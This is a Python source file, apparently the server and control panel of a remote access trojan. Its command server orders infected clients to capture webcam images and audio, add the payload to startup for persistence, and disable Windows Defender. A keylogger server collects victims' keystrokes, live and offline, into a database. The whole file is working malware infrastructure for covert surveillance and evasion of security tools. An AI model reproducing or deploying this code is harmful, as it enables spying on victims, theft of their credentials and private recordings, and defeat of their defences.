            logs.append([get_time_stamp(), 'COMMAND SERVER', f'ERROR OCCURRED ON CLIENT SIDE  WHILE TAKING WEBCAM IMAGE FOR CLIENT: [{[{client.client_address}]}]'])
            return 404
        unzipped_photos = extract_zip_to_filenames('received_webcam_pics.zip')
        self.database_handle.upload_webcam_pictures(client.client_id, unzipped_photos)

        os.remove('received_webcam_pics.zip')
        print(f'[{get_time_stamp()}] [COMMAND SERVER] WEBCAM IMAGES RECEIVED FROM [{client.client_address}]')
        logs.append([get_time_stamp(), 'COMMAND SERVER',
                    f'WEBCAM IMAGES RECEIVED FROM [{client.client_address}]'])

        return 200

    def get_audio(self, client, parameters):
        audio_duration = parameters[0]
        client.send_data(['AUDIO', audio_duration])

        return_code = client.receive_file('received_audio_clip.wav')
        if return_code == '404':  # If webcam capture was not successful it returns 404
            os.remove('received_audio_clip.wav')
            print(
                f'[{get_time_stamp()}] [COMMAND SERVER] ERROR OCCURRED ON CLIENT SIDE  WHILE RECORDING AUDIO CLIENT: '
                f'[{client.client_address}]]')
            logs.append(
                [get_time_stamp(), 'COMMAND SERVER', f'ERROR OCCURRED ON CLIENT SIDE  WHILE RECORDING AUDIO CLIENT: {client.client_address}'])

            return 404
        self.database_handle.upload_audio(client.client_id, 'received_audio_clip.wav', str(audio_duration))
        os.remove('received_audio_clip.wav')
        print(
            f'[{get_time_stamp()}] [COMMAND SERVER] AUDIO RECORDING RECEIVED FROM [{client.client_address}]')
        logs.append(
            [get_time_stamp(), 'COMMAND SERVER', f'AUDIO RECORDING RECEIVED FROM [{client.client_address}]'])
        return 200

    def set_startup(self, client):
        client.send_data('STARTUP')
        status = client.receive_data().decode()
        if status == '200':
            print(f'[{get_time_stamp()}] [COMMAND SERVER] PAYLOAD ADDED TO THE STARTUP OF CLIENT: [{client.client_address}]')
            logs.append(
                [get_time_stamp(), 'COMMAND SERVER',
                 f'PAYLOAD ADDED TO THE STARTUP OF CLIENT: [{client.client_address}]'])
            return 200
        elif status == '404':
            print(f'[{get_time_stamp()}] [COMMAND SERVER] COULD NOT ADD PAYLOAD TO STARTUP OF CLIENT: [{client.client_address}]')
            logs.append(
                [get_time_stamp(), 'COMMAND SERVER',
                 f'COULD NOT ADD PAYLOAD TO STARTUP OF CLIENT: [{client.client_address}]'])
            return 404

    def kill_client(self, client):
        try:
            client.send_data(['KILL',])
            print(f'[{get_time_stamp()}] KILL COMMAND SENT TO {client.client_address}')
            logs.append([get_time_stamp(), 'COMMAND SERVER', f'[{get_time_stamp()}] KILL COMMAND SENT TO {client.client_address}'])
            return 200

        except Exception as Error:
            print(f'ERROR IN KILL COMMAND: {Error}')
            logs.append([get_time_stamp(), 'COMMAND SERVER',
                        f'ERROR IN KILL COMMAND: {Error}'])

            return 404

    def disable_defender(self, client):
        choice = input('[WARNING] THIS COMMAND IS A LEVEL 3 IN NOISE '
                       'AND HAS A VERY HIGH LIKELIHOOD OF TRIGGERING DETECTION SYSTEMS. '
                       'DO YOU WISH TO PROCEED? Y/N] :').upper()
        if choice == 'Y':
            client.send_data(['DEFENDER',])
            return_status = client.receive_data()

            if return_status == b'200':
                print(f'[{get_time_stamp()}] DEFENDER COMMAND SENT TO {client.client_address}')
                logs.append(get_time_stamp(), 'COMMAND SERVER',
                            f'DEFENDER COMMAND SENT TO {client.client_address}')
                return 200
            elif return_status == b'404':
                print(f'[{get_time_stamp()}] ERROR ON CLIENT SIDE WHILE DISABLING DEFENDER')
                logs.append(get_time_stamp(), 'COMMAND SERVER',
                            f'ERROR ON CLIENT SIDE WHILE DISABLING DEFENDER')
                return 404

    def send_updated_config(self, client):
        client.send_data(['UPDATE',])
        client_config = self.database_handle.get_config_file(client.client_id)
        client.send_data(serialize_data(client_config))
        return_code = client.receive_data()
        return return_code.decode()


class Client:
    client_connection = None
    client_address = None
    database_handle = None
    #mac_address = None
    name = None
    sID = None
    client_id = None
    Root_Cert_Private = None

    def __init__(self):
        self.database_handle = ServerDatabase.DataBase()
        return

    def connect(self, client, client_address):
        try:
            self.database_handle.log_tcp_connection(client_address, 'COMMAND')  # Logs TCP connection
            self.client_connection = client
            self.client_address = client_address

            self.sID = self.receive_data().decode()

            if self.database_handle.client_exists(self.sID):  # CheckS if client exists
                self.send_data('200')
                self.client_id = self.database_handle.get_client_id(sID=self.sID) # Gets client id
                self.database_handle.log_client_connection_wID(self.client_id, client_address, 'COMMAND', 1)  # Logs
                # client connection

            else:  # Client does not exist
                enumerate = list()

                enumerate.append(self.client_address[0]) # IP
                enumerate.append(self.sID) # SID OF CLIENT

                enumerate_info = self.enumerate_client() # List that will hold the enumerated data from client and send it to be added.
                enumerate_info = enumerate + enumerate_info

                self.client_id = self.database_handle.add_new_client(enumerate_info, self.client_address[1])
                self.database_handle.log_client_connection_wID(self.client_id, (self.client_address[0], self.client_address[1]), 'COMMAND', 1)

            self.command_server_handshake()
        except OSError as Error:
            if str(Error) == '[WinError 10038] An operation was attempted on something that is not a socket':
                self.client_connection.close()
        except (ConnectionAbortedError, ConnectionResetError):
            self.client_connection.close()

    def command_server_handshake(self):
        # start ping thread which should log client disconnection from command server into DB.
        self.name = self.database_handle.get_name(self.client_id)
        client_config = self.database_handle.get_config_file(self.client_id)
        self.send_data(serialize_data(client_config))

    def enumerate_client(self):
        self.send_data('ENUMERATE')
        info = deserialize_data(self.receive_data())  # Receives list with enumerated info
        return info

    def receive_data(self):
        input_data_size = self.client_connection.recv(HEADER)  # Receives data size of message
        input_data_size = input_data_size.decode()
        data = self.client_connection.recv(int(input_data_size))  # Receives welcome message.
        return data

    def send_data(self, data):  # Sends actual data to client.

        if type(data) == str:
            data = data.encode()
        elif type(data) != bytes:
            data = serialize_data(data)

        data_length = len(data)  # Length of string.
        size_length = str(data_length).encode("utf-8")  # Encoded length
        size_length += b' ' * (HEADER - len(size_length))  # Padded length with header.
        self.client_connection.sendall(size_length)  # Send message size to target.
        self.client_connection.sendall(data)  # Sends message to target.1

    def receive_file(self, filename):

        file = open(filename, 'wb')
        while True:
            chunk = self.client_connection.recv(1024)
            if chunk == b'404':  # Client was unable to take screenshot
                file.write(chunk[:-1])
                file.close()
                return '404'
            if chunk[-3:] == b'END':  # Has finished sending file
                file.write(chunk[:-3])
                file.close()
                return '200'
            else:
                file.write(chunk)


class KeyloggerServer:
    keylogger_ip, keylogger_port = '192.168.1.21', 11220
    ping_port = 11280

    database_handle = None
    keylogger_socket = None
    config = None
    keylogger_server_enabled = None
    keylogger_handles = []
    certificate = None
    private_key = None
    keylogger_server_connected = None
    ping_socket = None
    ping_service_connected = False
    ping_connections = []
    removingClients = False

    def __int__(self):
        return

    def read_keylogger_server_config(self):
        while True:
            self.config = self.database_handle.get_server_config()
            if self.config is None:
                logs.append(get_time_stamp(), 'KEYLOGGER SERVER',
                            f'NO CONFIG EXISTS')

                print('NO CONFIG EXISTS')
            if self.config[1] == 1:  # Key logger server is enabled
                self.keylogger_server_enabled = True
            elif self.config[1] == 0:
                self.keylogger_server_enabled = False
                if self.keylogger_socket is not None:
                    self.keylogger_socket.close()
                    self.keylogger_socket = None
                if self.ping_socket is not None:
                    self.ping_socket.close()
                    self.ping_socket = None
            time.sleep(IDLE_TIME * 5)  # Wait 5 seconds before checking again

    def close_keylogger_server(self):
        # Sets flag to true so other checks dont log the client disconnection.
        # Makes  database insert to log all the clients disconnected
        # Sets flag to false so normal operations proceed
        if not self.removingClients:
            self.removingClients = True
            if self.ping_socket is not None:
                self.ping_socket.close()
            if self.keylogger_socket is not None:
                self.keylogger_socket.close()
            self.database_handle.log_clients_offline(self.keylogger_handles, 'KEYLOGGER')
            for client in self.keylogger_handles:
                client.keylogger_connection.close()
            for client in self.ping_connections:
                client[1].close() # Connection is stored as second element in ping_connections tuple

            self.keylogger_handles = []
            self.ping_connections = []
            # This is in case the client disconnects
            self.ping_service_connected = False
            self.keylogger_server_connected = False
            self.removingClients = False

    def start_keylogger_listener(self):
        while True:
            if self.keylogger_server_enabled:
                self.listen()
            time.sleep(IDLE_TIME)

    def listen(self):

        while self.keylogger_server_enabled:  # Start command server if enabled, start listening
            try:
                if self.keylogger_socket is None:
                    self.keylogger_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                    #  Updated steps

                    self.keylogger_socket.bind((self.keylogger_ip, self.keylogger_port))
                    self.keylogger_socket.listen(5)
                    print(
                        f'[{get_time_stamp()}] [KEYLOGGER SERVER] LISTENING AT {self.keylogger_ip}: {self.keylogger_port}')
                    logs.append([get_time_stamp(), 'KEYLOGGER SERVER',
                                 f'LISTENING AT {self.keylogger_ip}: {self.keylogger_port}'])
                    self.keylogger_server_connected = True

                client, client_address = self.keylogger_socket.accept()
                keylogger_handle = KeyloggerClient()
                self.keylogger_handles.append(keylogger_handle)
                print(f'[{get_time_stamp()}] [KEYLOGGER SERVER] RECEIVED CONNECTION FROM: {client_address}')
                logs.append([get_time_stamp(), 'KEYLOGGER SERVER',
                            f'RECEIVED CONNECTION FROM: {client_address}'])
                keylogger_client_thread = threading.Thread(target=keylogger_handle.connect,
                                                           args=(client, client_address))
                keylogger_client_thread.start()

            except (ConnectionResetError, ConnectionAbortedError, ConnectionError, OSError, AttributeError) as Error:
                print(f'[{get_time_stamp()}] [KEYLOGGER SERVER] SERVER SOCKET WAS CLOSED: {Error}')
                time.sleep(IDLE_TIME)
                self.close_keylogger_server()
                logs.append([get_time_stamp(), 'KEYLOGGER SERVER',
                            f'SERVER SOCKET WAS CLOSED: {Error}'])

    def listen_keylogger_server_ping_service(self):
        while True:
            try:
                if self.keylogger_server_enabled:
                    # Load the SSL context using the certificate and private_key bytes read from database
                    self.ping_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.ping_socket.bind((self.keylogger_ip, self.ping_port))
                    self.ping_socket.listen(5)
                    print(f"[{get_time_stamp()}] [KEYLOGGER PING SERVER] LISTENING AT {self.keylogger_ip}:{self.ping_port}")
                    logs.append([get_time_stamp(), 'KEYLOGGER PING SERVER',
                                f'LISTENING AT {self.keylogger_ip}:{self.ping_port}'])
                    self.ping_service_connected = True
                    while self.ping_service_connected and self.keylogger_server_enabled:
                        try:
                            if self.ping_socket is None:
                                # Load the SSL context using the certificate and private_key bytes read from database
                                self.ping_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                self.ping_socket.bind((self.keylogger_ip, self.ping_port))
                                self.ping_socket.listen(5)
                                print(
                                    f"[{get_time_stamp()}] [KEYLOGGER PING SERVER] LISTENING AT {self.keylogger_ip}:{self.ping_port}")
                                logs.append([get_time_stamp(), 'KEYLOGGER PING SERVER',
                                             f'LISTENING AT {self.keylogger_ip}:{self.ping_port}'])
                                self.ping_service_connected = True
                            ping_connection, ping_address = self.ping_socket.accept()
                            print(
                                f"[{get_time_stamp()}] [KEYLOGGER PING SERVER] RECEIVED A CONNECTION FROM {ping_address[0]}:{ping_address[1]}")
                            logs.append([get_time_stamp(), 'KEYLOGGER PING SERVER',
                                        f'RECEIVED A CONNECTION FROM {ping_address[0]}:{ping_address[1]}'])
                            self.ping_connections.append((ping_address, ping_connection))
                        except OSError as Error:
                            logs.append([get_time_stamp(), 'KEYLOGGER PING SERVER',
                                         f'SERVER SOCKET WAS CLOSED: {Error}'])
                            self.close_keylogger_server()

                        time.sleep(IDLE_TIME)
            except OSError as Error:
                if not Error.args[0] == '[WinError 10038] An operation was attempted on something that is not a socket':
                    raise OSError

            time.sleep(IDLE_TIME)

    def check_keylogger_clients_online(self):
        # ping_client[0][0] = IP Address of client
        while True:
            while self.keylogger_server_enabled:
                for ping_client in self.ping_connections:  # Will go through list of clients to ping
                    try:
                        ping_client[1].send(
                            b'Ping')  # Sends a byte to test response. Can also make it so that whena a specific code is sent here the client disconnects

                        ping_client[1].recv(4)  # Receives response
                        #time.sleep(IDLE_TIME)
                    except (ConnectionError, ConnectionResetError, TimeoutError,
                            ) as Error:  # If a client did not receive or send response they are not connected.
                        if not self.removingClients:
                            for client in self.keylogger_handles:  # Looks for client in client handles to disconnect from command server
                                if client.client_address[0] == ping_client[0][0]:
                                    # If client address is equal to the address of
                                    # the disconnected ping then remove it from list.
                                    self.database_handle.log_client_connection_wID(client.client_id,
                                                                                   client.client_address, 'KEYLOGGER',
                                                                                   0)  # Logs the disconnection in the server
                                    self.keylogger_handles.remove(client)
                                    self.ping_connections.remove(ping_client)
                                    client.keylogger_connection.close()
                                    print(
                                        f'[{get_time_stamp()}] [KEYLOGGER SERVICE] DISCONNECTED FROM CLIENT {client.client_address} : {Error}')

                                    logs.append([get_time_stamp(), 'KEYLOGGER SERVER',
                                                 f'DISCONNECTED FROM CLIENT {client.client_address} : {Error}'])

                                    logs.append([get_time_stamp(), 'KEYLOGGER PING SERVER',
                                                f'DISCONNECTED FROM CLIENT {client.client_address} : {Error}'])
                                    print(
                                        f'[{get_time_stamp()}] [KEYLOGGER PING SERVICE] DISCONNECTED FROM CLIENT {ping_client[0][0]} : {Error}')

                time.sleep(IDLE_TIME * 5)
            time.sleep(IDLE_TIME * 5)


class KeyloggerClient:
    keylogger_connection = None
    client_address = None
    database_handle = None
    sID = None
    mac_address = None
    client_id = None
    keylogger_enabled = None

    def connect(self, client, client_address):
        self.database_handle = ServerDatabase.DataBase()
        self.database_handle.log_tcp_connection(client_address, 'KEYLOGGER')
        self.keylogger_connection = client
        self.client_address = client_address

        try:
            self.keylogger_handshake()

            # Should only receive keylogger data if client_config is enabled.
            # When the config
            self.keylogger_enabled = self.database_handle.keylogger_enabled(self.client_id)
            if self.keylogger_enabled:
                self.receive_keylogger_data()

        except ConnectionError as Error:
           #self.database_handle.log_client_connection_wID(self.client_id, self.client_address, 'KEYLOGGER', 0)
            return ConnectionResetError

    def keylogger_handshake(self):
        self.sID = self.receive_data().decode()

        #self.mac_address = deserialize_data(self.receive_data())
        while self.client_id is None:  # Wait until command server enumerates client. If not then it should not proceed.
            self.client_id = self.database_handle.get_client_id(self.sID)
        #self.client_id = self.database_handle.get_client_id_from_mac(self.mac_address)
        self.database_handle.log_client_connection_wID(self.client_id, self.client_address, 'KEYLOGGER', 1)

        offline_data_exists = self.receive_data().decode()
        if offline_data_exists == '1':
            self.receive_offline_data()


    def receive_offline_data(self):
        print(f'[{get_time_stamp()}] [KEYLOGGER SERVER] RECEIVING KEY LOGGER OFFLINE DATA')
        logs.append([get_time_stamp(), 'KEYLOGGER SERVER',
                    f'RECEIVING KEY LOGGER OFFLINE DATA'])
        record = None  # Offline files are over
        while record != "[END]":
            record = self.receive_data()
            record = deserialize_data(record)
            if record != "[END]":
                self.database_handle.upload_offline_data(record)

    def receive_keylogger_data(self):
        while self.keylogger_enabled:  # Will Raise error once the connection is invalid.
            try:
                log_packet = deserialize_data(self.receive_data())
                self.database_handle.upload_keylog_data(log_packet)
            except ValueError:
                raise ConnectionError

    def receive_data(self):
        try:
            input_data_size = self.keylogger_connection.recv(HEADER)  # Receives data size of message
            input_data_size = input_data_size.decode()
            data = self.keylogger_connection.recv(int(input_data_size))  # Receives welcome message.
            return data
        except ValueError as Error:
            print(f'{get_time_stamp()} [KEYLOGGER SERVER] VALUE ERROR CLIENT MAY HAVE DISCONNECTED : {Error}')
            logs.append([get_time_stamp(), 'KEYLOGGER SERVER',
                        f'VALUE ERROR CLIENT MAY HAVE DISCONNECTED : {Error}'])
            self.keylogger_connection.close()
            raise ValueError


qdarktheme.enable_hi_dpi()
app = QApplication()
#qdarktheme.load_palette('color:#a31d16;')

qdarktheme.setup_theme()

UI = guiMain()
start_thread = threading.Thread(target=UI.load_backend)
start_thread.start()

loadDashboard_thread = threading.Thread(target=UI.load_frontend)
loadDashboard_thread.start()
UI.show()
sys.exit(app.exec_())